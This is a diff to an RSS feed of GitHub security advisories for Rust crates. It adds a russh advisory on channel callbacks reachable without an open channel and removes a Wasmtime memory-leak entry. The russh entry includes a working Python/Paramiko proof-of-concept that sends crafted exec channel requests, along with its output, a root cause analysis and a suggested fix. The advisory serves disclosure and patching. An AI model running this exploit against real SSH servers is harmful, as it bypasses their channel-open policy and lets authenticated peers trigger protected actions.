@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/rust.rss</id>
     <title>Security Advisory for Rust crates</title>
-    <updated>2026-08-03T12:47:31.651Z</updated>
+    <updated>2026-08-03T15:35:47.461Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Arust"/>
     <subtitle>Security Advisory for Rust crates on GitHub</subtitle>
@@ -11,6 +11,343 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[russh] Russh: Channel-scoped server callbacks can be reached without an open channel]]></title>
+        <id>https://github.com/advisories/GHSA-m65r-rprj-r5rg</id>
+        <link href="https://github.com/advisories/GHSA-m65r-rprj-r5rg"/>
+        <updated>2026-08-03T15:35:05.000Z</updated>
+        <content type="html"><![CDATA[<p>There is a server-side channel state issue in <code>russh</code>.</p>
+<p>After a client is authenticated, <code>russh</code> can dispatch channel-scoped handler callbacks for recipient channel IDs that were never opened or confirmed. In the strongest reproduced case, the client does not send <code>SSH_MSG_CHANNEL_OPEN</code> at all. It authenticates normally, then sends <code>SSH_MSG_CHANNEL_REQUEST</code> packets with request type <code>exec</code> for a range of recipient channel IDs. <code>russh</code> still calls the server application's <code>exec_request</code> handler.</p>
+<p>This is not an authentication bypass. A valid login is required. The issue is that the SSH channel lifecycle is not enforced before channel-scoped callbacks are delivered to the application.</p>
+<h2 id="impact">Impact</h2>
+<p>An authenticated client can bypass the server application's channel-open policy.</p>
+<p>A server may deny session channels by returning <code>false</code> from <code>Handler::channel_open_session</code>. A server may also assume that callbacks such as <code>exec_request</code>, <code>shell_request</code>, <code>subsystem_request</code>, <code>data</code>, <code>channel_eof</code>, or <code>channel_close</code> are only delivered for channels that were opened and confirmed by the SSH transport layer.</p>
+<p>That assumption does not hold in the vulnerable path. A malicious authenticated peer can send channel-scoped messages for arbitrary recipient channel IDs and cause handler callbacks to run even though no channel exists.</p>
+<p>The exact impact depends on the downstream application. For many SSH server use cases, <code>exec_request</code>, <code>shell_request</code>, or <code>subsystem_request</code> start commands, jobs, shells, SFTP-like subsystems, internal workflows, or other state-changing operations. In the PoC, the protected <code>exec_request</code> action runs even though no channel was opened.</p>
+<h2 id="why-this-is-not-intended-behavior">Why this is not intended behavior</h2>
+<p>SSH channel requests are not global post-authentication requests. They are operations on an existing channel.</p>
+<p>RFC 4254 describes channel-specific messages as carrying a recipient channel number. The <code>exec</code> request is a <code>SSH_MSG_CHANNEL_REQUEST</code> for a session channel. That means the recipient channel should refer to a channel that exists in the local open-channel state.</p>
+<p>The relevant boundary is therefore not password authentication. The boundary is the channel-open decision. If no channel has been opened, or if the application denied the open request, <code>russh</code> should not deliver session-specific callbacks for that recipient ID.</p>
+<p>This is also not just a handler bug. The handler does not own the transport channel table. <code>russh</code> does. The application gets a <code>channel_open_*</code> callback and returns whether the channel is allowed. If that decision is denied, or if the client never requested a channel at all, channel-scoped callbacks should not be reachable.</p>
+<h2 id="documentation-and-api-boundary">Documentation and API boundary</h2>
+<p>The public API documentation supports this boundary.</p>
+<p><code>channel_open_session</code> is the application hook for creating a new session channel, and its boolean return value is the application's decision on whether that channel open should be granted. Separately, <code>exec_request</code> is the application hook for deciding what to do with a command request received on a channel.</p>
+<p>Those are different responsibilities. The application can decide whether a command is allowed. The library must first decide whether the recipient channel exists and was actually opened.</p>
+<p>Delivering <code>exec_request</code> for a recipient <code>ChannelId</code> that is absent from the established channel table bypasses the channel-open decision before the application can safely rely on it.</p>
+<h2 id="root-cause">Root cause</h2>
+<p>In <code>server_read_authenticated</code> in <code>russh/src/server/encrypted.rs</code>, channel-scoped messages are decoded and then dispatched to handler callbacks without a mandatory check that the recipient channel is established in the encrypted session's channel table.</p>
+<p>The problematic pattern is visible in the <code>CHANNEL_REQUEST</code> handling. The code reads the recipient channel ID and request fields. It may look up the channel to send an internal <code>ChannelMsg</code> into the stream API, but the handler callback is outside that guard.</p>
+<p>For example, the <code>exec</code> branch has this shape:</p>
+<pre><code class="language-rust">"exec" =&gt; {
+    let req = map_err!(Bytes::decode(r))?;
+    map_err!(ensure_end(r))?;
+
+    if let Some(chan) = self.channels.get(&amp;channel_num) {
+        let _ = chan
+            .send(ChannelMsg::Exec {
+                want_reply: true,
+                command: req.to_vec(),
+            })
+            .await;
+    }
+
+    handler.exec_request(channel_num, &amp;req, self).await
+}
+</code></pre>
+<p>If <code>channel_num</code> is not open, the internal send is skipped, but <code>handler.exec_request(...)</code> is still called.</p>
+<p>The same issue applies to other channel-scoped callbacks such as <code>shell_request</code>, <code>subsystem_request</code>, <code>env_request</code>, <code>pty_request</code>, <code>data</code>, <code>extended_data</code>, <code>channel_eof</code>, and <code>channel_close</code>.</p>
+<p>There is a second related problem in <code>server_handle_channel_open</code>. The application-side channel reference can be inserted into <code>self.channels</code> even when the handler returns <code>Ok(false)</code>. The protocol table <code>enc.channels</code> is only populated when the open is actually allowed. This means the two maps can diverge after a denied open.</p>
+<p>The authoritative source for whether a channel is established should be <code>enc.channels</code>, not <code>self.channels</code>.</p>
+<h2 id="evidence-from-the-poc">Evidence from the PoC</h2>
+<p>The PoC uses a real <code>russh</code> server over localhost TCP. It uses real authentication with username <code>alice</code> and password <code>correct</code>. Paramiko is used only as an authenticated SSH peer that can send crafted packets over the real encrypted SSH transport.</p>
+<p>POC Code :</p>
+<pre><code class="language-python">import argparse
+import sys
+import time
+
+import paramiko
+from paramiko.common import MSG_CHANNEL_REQUEST, cMSG_CHANNEL_REQUEST
+from paramiko.message import Message
+from paramiko.ssh_exception import ChannelException
+
+CHANNEL_SCAN_END = 32
+
+
+def connect(port: int) -&gt; paramiko.Transport:
+    transport = paramiko.Transport(("127.0.0.1", port))
+    transport.connect(username="alice", password="correct")
+    return transport
+
+
+def normal_allowed(port: int) -&gt; None:
+    transport = connect(port)
+    print("normal client: CHANNEL_OPEN session")
+    channel = transport.open_session(timeout=5)
+    print("normal client: session open confirmed")
+    print('normal client: exec "protected"')
+    channel.exec_command("protected")
+    time.sleep(0.25)
+    channel.close()
+    transport.close()
+
+
+def normal_denied(port: int) -&gt; None:
+    transport = connect(port)
+    print("normal client: CHANNEL_OPEN session")
+    try:
+        transport.open_session(timeout=5)
+    except ChannelException:
+        print("normal client: session open denied")
+        pass
+    else:
+        raise RuntimeError("normal denied control unexpectedly opened a session channel")
+    time.sleep(0.25)
+    transport.close()
+
+
+def send_exec_request(transport: paramiko.Transport, recipient_channel: int) -&gt; None:
+    print(
+        "crafted packet: "
+        f"SSH_MSG_CHANNEL_REQUEST({MSG_CHANNEL_REQUEST}) "
+        f"recipient_channel={recipient_channel} "
+        'request_type="exec" '
+        'command="protected"'
+    )
+    msg = Message()
+    msg.add_byte(cMSG_CHANNEL_REQUEST)
+    msg.add_int(recipient_channel)
+    msg.add_string("exec")
+    msg.add_boolean(True)
+    msg.add_string(b"protected")
+    transport._send_user_message(msg)
+
+
+def exploit_denied(port: int) -&gt; None:
+    transport = connect(port)
+    print("malicious peer: CHANNEL_OPEN session")
+    try:
+        transport.open_session(timeout=5)
+    except ChannelException:
+        print("malicious peer: session open denied")
+    else:
+        raise RuntimeError("exploit setup unexpectedly opened a session channel")
+
+    print(f"malicious peer: scanning recipient channel ids 0..{CHANNEL_SCAN_END - 1}")
+    for channel_id in range(CHANNEL_SCAN_END):
+        send_exec_request(transport, channel_id)
+        time.sleep(0.01)
+    time.sleep(0.5)
+    transport.close()
+
+
+def exploit_without_open(port: int) -&gt; None:
+    transport = connect(port)
+    print("malicious peer: no CHANNEL_OPEN sent")
+    print(f"malicious peer: scanning recipient channel ids 0..{CHANNEL_SCAN_END - 1}")
+    for channel_id in range(CHANNEL_SCAN_END):
+        send_exec_request(transport, channel_id)
+        time.sleep(0.01)
+    time.sleep(0.5)
+    transport.close()
+
+
+def main() -&gt; int:
+    parser = argparse.ArgumentParser()
+    parser.add_argument(
+        "--mode",
+        choices=["allowed", "denied", "denied-open", "noopen"],
+        required=True,
+    )
+    parser.add_argument("--port", type=int, required=True)
+    args = parser.parse_args()
+
+    if args.mode == "allowed":
+        normal_allowed(args.port)
+    elif args.mode == "denied":
+        normal_denied(args.port)
+    elif args.mode == "noopen":
+        exploit_without_open(args.port)
+    else:
+        exploit_denied(args.port)
+    return 0
+
+
+if __name__ == "__main__":
+    sys.exit(main())
+</code></pre>
+<p>The crafted packet form is:</p>
+<pre><code class="language-text">SSH_MSG_CHANNEL_REQUEST(98)
+recipient_channel = N
+request_type = "exec"
+command = "protected"
+</code></pre>
+<p>The PoC runs normal controls and exploit cases in one execution.</p>
+<h3 id="allowed-control">Allowed control</h3>
+<p>This proves the protected action works normally when a session channel is opened.</p>
+<pre><code class="language-text">normal client: CHANNEL_OPEN session
+normal client: session open confirmed
+normal client: exec "protected"
+
+channel_open_session called: 1
+exec_request called: 1
+protected action executed: 1
+channel ever opened/confirmed: true
+working recipient channel ids: [2]
+</code></pre>
+<h3 id="denied-control">Denied control</h3>
+<p>This proves the application policy denies session channels and a normal client cannot reach the protected action.</p>
+<pre><code class="language-text">normal client: CHANNEL_OPEN session
+normal client: session open denied
+
+channel_open_session called: 1
+exec_request called: 0
+protected action executed: 0
+channel ever opened/confirmed: false
+working recipient channel ids: none
+</code></pre>
+<h3 id="main-exploit-no-channel-open">Main exploit: no channel open</h3>
+<p>This is the main issue.</p>
+<p>The authenticated client does not send <code>SSH_MSG_CHANNEL_OPEN</code>. It sends crafted <code>SSH_MSG_CHANNEL_REQUEST</code> packets for recipient IDs <code>0..31</code>.</p>
+<pre><code class="language-text">malicious peer: no CHANNEL_OPEN sent
+malicious peer: scanning recipient channel ids 0..31
+
+channel_open_session called: 0
+exec_request called: 32
+protected action executed: 32
+channel ever opened/confirmed: false
+working recipient channel ids: [0, 1, 2, ..., 31]
+</code></pre>
+<p>This removes the "guessed channel ID" concern. Every scanned recipient ID reached the protected action in the vulnerable run.</p>
+<h3 id="additional-variant-denied-open">Additional variant: denied open</h3>
+<p>The client asks for a session channel, the handler denies it, and the client then sends the same crafted requests.</p>
+<pre><code class="language-text">malicious peer: CHANNEL_OPEN session
+malicious peer: session open denied
+
+channel_open_session called: 1
+exec_request called: 32
+protected action executed: 32
+channel ever opened/confirmed: false
+working recipient channel ids: [0, 1, 2, ..., 31]
+</code></pre>
+<p>The denied-open variant is not required for exploitability, but it shows the same state validation gap after an explicit application denial.</p>
+<h2 id="affected-code-path">Affected code path</h2>
+<p>Verified at:</p>
+<pre><code class="language-text">f1a0f180a02ccedf48d86f2c5e0361308cf6b7c6
+v0.61.1-9-gf1a0f18
+</code></pre>
+<p>The affected logic is in:</p>
+<pre><code class="language-text">russh/src/server/encrypted.rs
+</code></pre>
+<p>The vulnerable area is:</p>
+<pre><code class="language-text">server_read_authenticated
+</code></pre>
+<p>Channel request dispatch decodes a recipient channel ID and calls request-specific handler callbacks without first requiring that the recipient ID exists as a confirmed channel in <code>enc.channels</code>.</p>
+<p>The affected request callbacks include:</p>
+<pre><code class="language-text">pty_request
+x11_request
+env_request
+shell_request
+agent_request
+exec_request
+subsystem_request
+window_change_request
+signal
+</code></pre>
+<p>The same missing established-channel guard affects:</p>
+<pre><code class="language-text">CHANNEL_DATA
+CHANNEL_EXTENDED_DATA
+CHANNEL_EOF
+CHANNEL_CLOSE
+</code></pre>
+<p>A related issue exists in:</p>
+<pre><code class="language-text">server_handle_channel_open
+</code></pre>
+<p>Application channel references should not be retained for denied opens.</p>
+<h2 id="why-this-belongs-in-russh">Why this belongs in russh</h2>
+<p>The application cannot reliably enforce the SSH transport channel lifecycle from inside individual callbacks. By the time <code>exec_request</code> is called, the application is already being told that a channel-scoped request exists. The library should not call that handler for a channel ID that does not exist in the confirmed channel table.</p>
+<p>This is the same kind of invariant <code>russh</code> already applies for some channel state updates. The missing part is to apply the established-channel check consistently before all channel-scoped callbacks are dispatched.</p>
+<p>The safe expectation is simple:</p>
+<pre><code class="language-text">No established channel, no channel-scoped handler callback.
+</code></pre>
+<h2 id="suggested-fix">Suggested fix</h2>
+<p>Before dispatching any channel-scoped callback, require the recipient <code>ChannelId</code> to exist in the encrypted session's established channel table and to be confirmed.</p>
+<p>The authoritative check should use <code>enc.channels</code>, not <code>self.channels</code>.</p>
+<p>A minimal approach is to add a helper like:</p>
+<pre><code class="language-rust">fn ensure_established_channel(&amp;self, channel: ChannelId) -&gt; Result&lt;(), Error&gt; {
+    if self
+        .common
+        .encrypted
+        .as_ref()
+        .and_then(|enc| enc.channels.get(&amp;channel))
+        .is_some_and(|channel| channel.confirmed)
+    {
+        Ok(())
+    } else {
+        Err(Error::Inconsistent)
+    }
+}
+</code></pre>
+<p>Then call it before dispatching channel-scoped callbacks for:</p>
+<pre><code class="language-text">CHANNEL_REQUEST
+CHANNEL_DATA
+CHANNEL_EXTENDED_DATA
+CHANNEL_EOF
+CHANNEL_CLOSE
+CHANNEL_WINDOW_ADJUST
+</code></pre>
+<p>For unknown or unconfirmed channels, <code>russh</code> should not call application callbacks. The exact wire response can be request failure, ignore, or disconnect depending on the existing protocol-error handling for that message type.</p>
+<p>The channel-open path should also retain application-side channel references only when the open is approved:</p>
+<pre><code class="language-rust">let mut result = handler.channel_open_session(channel, self).await;
+
+if let Ok(allowed) = &amp;mut result {
+    if *allowed {
+        self.channels.insert(sender_channel, reference);
+    }
+
+    self.finalize_channel_open(&amp;msg, channel_params, *allowed)?;
+}
+</code></pre>
+<h2 id="regression-coverage">Regression coverage</h2>
+<p>A regression test should authenticate normally, then verify that callbacks are not reached in these cases:</p>
+<pre><code class="language-text">1. CHANNEL_REQUEST "exec" without prior CHANNEL_OPEN
+2. CHANNEL_OPEN "session" denied by the handler, then CHANNEL_REQUEST "exec"
+3. CHANNEL_DATA without prior CHANNEL_OPEN
+4. CHANNEL_EOF / CHANNEL_CLOSE without prior CHANNEL_OPEN
+</code></pre>
+<p>The test should fail if any channel-scoped callback such as <code>exec_request</code>, <code>shell_request</code>, <code>subsystem_request</code>, <code>data</code>, <code>channel_eof</code>, or <code>channel_close</code> is invoked for a non-established channel.</p>
+<p>A positive control should confirm that a normally opened session channel still reaches the expected callbacks.</p>
+<p>In the local validation, the targeted regression passed after the patch:</p>
+<pre><code class="language-text">cargo test -p russh --test channel_state_validation
+</code></pre>
+<p>The full workspace also passed:</p>
+<pre><code class="language-text">cargo test --workspace
+</code></pre>
+<h2 id="duplicate-check">Duplicate check</h2>
+<p>I checked existing <code>Eugeny/russh</code> advisories and issue searches for terms related to:</p>
+<pre><code class="language-text">CHANNEL_REQUEST
+exec_request
+channel_open_session denied
+unopened channel
+server_handle_channel_open
+channel request handler
+</code></pre>
+<p>Existing advisories cover unrelated authentication, parser, allocation, window-adjust, Terrapin, and cryptographic issues. I did not find an existing advisory or issue for channel-scoped callbacks being dispatched for unopened or denied recipient channel IDs.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/Eugeny/russh/security/advisories/GHSA-m65r-rprj-r5rg">https://github.com/Eugeny/russh/security/advisories/GHSA-m65r-rprj-r5rg</a></li>
+<li><a href="https://github.com/Eugeny/russh/commit/7c5659f8cf6f6f2f9989d12dba0ebf49dc50a171">https://github.com/Eugeny/russh/commit/7c5659f8cf6f6f2f9989d12dba0ebf49dc50a171</a></li>
+<li><a href="https://github.com/Eugeny/russh/releases/tag/v0.62.5">https://github.com/Eugeny/russh/releases/tag/v0.62.5</a></li>
+<li><a href="https://github.com/advisories/GHSA-m65r-rprj-r5rg">https://github.com/advisories/GHSA-m65r-rprj-r5rg</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-m65r-rprj-r5rg</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-08-03T15:35:00.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[zaino-state] zaino-state has a Non-Finalized State Reorg — No Cycle Detection or Depth Limit]]></title>
         <id>https://github.com/advisories/GHSA-3whf-vgf2-9w6g</id>
@@ -1495,44 +1832,5 @@ fn main() {
         </author>
         <category label="severity" term="MODERATE"/>
         <published>2026-07-15T22:41:01.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[wasmtime-c-api-impl] Wasmtime: Memory leak in C API with `externref` and `anyref` types]]></title>
-        <id>https://github.com/advisories/GHSA-vvp9-h8p2-xwfc</id>
-        <link href="https://github.com/advisories/GHSA-vvp9-h8p2-xwfc"/>
-        <updated>2026-07-14T17:48:36.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
-<p>Wasmtime 37.0.0 and 37.0.1 have memory leaks in the C/C++ API when using bindings for the <code>anyref</code> or <code>externref</code> WebAssembly values. This is caused by a regression introduced during the development of 37.0.0 and all prior versions of Wasmtime are unaffected. If <code>anyref</code> or <code>externref</code> is not used in the C/C++ API then embeddings are also unaffected by the leaky behavior. The <code>wasmtime</code> Rust crate is unaffected by this leak.</p>
-<p>Development of Wasmtime 37.0.0 included a refactoring in Rust of changing the old <code>ManuallyRooted&lt;T&gt;</code> type to a new <code>OwnedRooted&lt;T&gt;</code> type. This change was integrated into Wasmtime's C API but left the C API in a state which had memory leaks. Additionally the new ownership semantics around this type were not reflected into the C++ API, making it leak-prone. A short version of the change is that previously <code>ManuallyRooted&lt;T&gt;</code>, as the name implies, required manual calls to an "unroot" operation. If this was forgotten then the memory was still cleaned up when the <code>wasmtime_store_t</code> itself was destroyed eventually. Documentation of when to "unroot" was sparse and there were already situations prior to 37.0.0 where memory would be leaked until the store was destroyed anyway. All memory, though, was always bound by the store, and destroying the store would guarantee that there were no memory leaks.</p>
-<p>In migrating to <code>OwnedRooted&lt;T&gt;</code> the usage of the type in Rust changed. A manual "unroot" operation is no longer required and it happens naturally as a destructor of the <code>OwnedRooted&lt;T&gt;</code> type in Rust itself. These new resource ownership semantics were not fully integrated into the preexisting semantics of the C/C++ APIs in Wasmtime. A crucial distinction of <code>OwnedRooted&lt;T&gt;</code> vs <code>ManuallyRooted&lt;T&gt;</code> is that the <code>OwnedRooted&lt;T&gt;</code> type allocates host memory outside of the store. This means that if an <code>OwnedRooted&lt;T&gt;</code> is leaked then destroying a store does not release this memory and it's a permanent memory leak on the host. This led to a few distinct, but related, issues arising:</p>
-<ul>
-<li>A typo in the <code>wasmtime_val_unroot</code> function in the C API meant that it did not actually unroot anything. This meant that even if embedders faithfully call the function then memory will be leaked.</li>
-<li>If a host-defined function returned a <code>wasmtime_{externref,anyref}_t</code> value then the value was never unrooted. The C/C++ API no longer has access to the value and the Rust implementation did not unroot. This meant that any values returned this way were never unrooted.</li>
-<li>The goal of the C++ API of Wasmtime is to encode automatic memory management in the type system, but the C++ API was not updated when <code>OwnedRooted&lt;T&gt;</code> was added. This meant that idiomatic usage of the C++ API would leak memory due to a lack of destructors on values.</li>
-</ul>
-<p>These issues have all been fixed in a 37.0.2 release of Wasmtime. The implementation of the C and C++ APIs have been updated accordingly and respectively to account for the changes of ownership here. For example <code>wasmtime_val_unroot</code> has been fixed to unroot, the Rust-side implementation of calling an embedder-defined function will unroot return values, and the C++ API now has destructors on the <code>ExternRef</code>, <code>AnyRef</code>, and <code>Val</code> types. These changes have been made to the 37.0.x release branch in a non-API-breaking fashion. Changes to the 38.0.0 release branch (and <code>main</code> in the Wasmtime repository) include minor API updates to better accomodate the API semantic changes.</p>
-<h3 id="patches">Patches</h3>
-<p>Wasmtime 37.0.2 has been released which fixes these issues. Users of 37.0.0 and 37.0.1 are recommended to upgrade. Users of 36.0.x and prior are unaffected and need not upgrade.</p>
-<h3 id="workarounds">Workarounds</h3>
-<p>The only known workaround at this time is to avoid using <code>externref</code> and <code>anyref</code> in the C/C++ API of Wasmtime. If avoiding those types is not possible then it's required for users to update to mitigate the leak issue.</p>
-<h3 id="remediations">Remediations</h3>
-<p>The Wasmtime project will be looking more closely into improving the situation around testing the C and C++ APIs of Wasmtime in the near future. For example we plan to integrate ASAN testing to discover leaks and errors earlier on in the development process. We're also going to look into expanding the test coverage of the C/C++ APIs to catch issues like this earlier on in development in the future.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/bytecodealliance/wasmtime/security/advisories/GHSA-vvp9-h8p2-xwfc">https://github.com/bytecodealliance/wasmtime/security/advisories/GHSA-vvp9-h8p2-xwfc</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-61670">https://nvd.nist.gov/vuln/detail/CVE-2025-61670</a></li>
-<li><a href="https://github.com/bytecodealliance/wasmtime/commit/adff9d9d0f09569203709d5687e5a7dc8e1ad0a3">https://github.com/bytecodealliance/wasmtime/commit/adff9d9d0f09569203709d5687e5a7dc8e1ad0a3</a></li>
-<li><a href="https://github.com/bytecodealliance/wasmtime/releases/tag/v37.0.2">https://github.com/bytecodealliance/wasmtime/releases/tag/v37.0.2</a></li>
-<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/wasmtime-bin/PYSEC-2025-268.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/wasmtime-bin/PYSEC-2025-268.yaml</a></li>
-<li><a href="https://github.com/advisories/GHSA-vvp9-h8p2-xwfc">https://github.com/advisories/GHSA-vvp9-h8p2-xwfc</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-vvp9-h8p2-xwfc</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2026-07-14T17:48:35.000Z</published>
     </entry>
 </feed>
